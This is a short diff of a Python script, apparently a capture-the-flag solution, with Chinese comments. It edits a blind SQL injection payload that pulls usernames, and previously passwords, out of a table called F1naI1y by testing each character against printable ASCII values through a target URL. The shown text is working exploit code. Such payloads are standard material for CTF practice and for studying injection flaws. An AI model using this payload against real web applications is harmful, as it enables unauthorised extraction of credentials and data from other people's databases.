@@ -55,7 +55,7 @@ flag = "Not this"
 '''这是username'''
 subs=1
 while True:
-    payload = "''or(ascii(substr((select(group_concat(password))from(F1naI1y)),{0},1))={1})"
+    payload = "''or(ascii(substr((select(group_concat(username))from(F1naI1y)),{0},1))={1})"
     targetUrl = url + payload
     # c表示33~127位ASCII中可显示字符
     for c in range(33, 128):
